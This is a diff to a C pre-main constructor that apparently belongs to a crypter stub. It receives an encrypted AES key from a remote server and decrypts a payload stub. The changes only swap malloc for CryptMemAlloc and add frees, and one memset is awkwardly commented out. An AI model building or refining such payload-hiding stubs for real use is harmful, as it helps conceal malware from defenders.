@@ -85,8 +85,8 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	 * Define Variables required to generate a cryptographically random integer
 	 */
 	BCRYPT_ALG_HANDLE randNumProv;
-	BYTE* OTP = malloc(AESKEYLEN+1);
-	memset(OTP,0,AESKEYLEN+1);
+	BYTE* OTP = CryptMemAlloc(AESKEYLEN+1);
+/*	memset(OTP,0,AESKEYLEN+1);
 	/* 
 	 * Define variables required to store the encrypted OTP
 	 */
@@ -101,7 +101,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * 
 	 */
-	BYTE* key;
+	BYTE* key = CryptMemAlloc(AESKEYLEN+1);
 	/*
 	 * Define variables required to decrypt the payload stub
 	 */
@@ -118,7 +118,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 		printf("DerLen %d",derPubKeyLen);
 		exit(0);
 	}
-	derPubKey = (BYTE*)malloc(derPubKeyLen);
+	derPubKey = (BYTE*)CryptMemAlloc(derPubKeyLen);
 	if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
 	{
 		DWORD err = GetLastError();   
@@ -220,7 +220,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	{
 		exit(-1);
 	}
-	recvData = malloc(1);
+	recvData = CryptMemAlloc(1);
 	/*
 	 * recieve a syncronizatioon byte to ensure data is recieved appropriatly. 
 	 */
@@ -241,7 +241,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * recieve the OTP encrypted AES key from the server
 	 */
-	recvData = malloc(AESKEYLEN+1);
+	//recvData = malloc(AESKEYLEN+1);
 	if(!recv(Connection,key,AESKEYLEN,0))
 	{
 		exit(-1);
@@ -261,7 +261,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	 if (!CryptStringToBinaryA(iv,0,CRYPT_STRING_ANY, NULL,&sz,NULL,NULL))
 		exit(0);
 
-	 decodedIV = malloc(sz+1);
+	 decodedIV = CryptMemAlloc(sz+1);
 	 if (!CryptStringToBinaryA(iv,0,CRYPT_STRING_ANY, decodedIV,&sz,NULL,NULL))
 		exit(0);
 	/*
@@ -302,6 +302,11 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 		printf("Error in destroying key");
 		exit(0);
 	}
+	CryptMemFree(OTP);
+	CryptMemFree(derPubKey);
+	CryptMemFree(key);
+	CryptMemFree(recvData);
+	CryptMemFree(decodedIV);
 	/*
 	 * gotta do some clean up here
 	 */
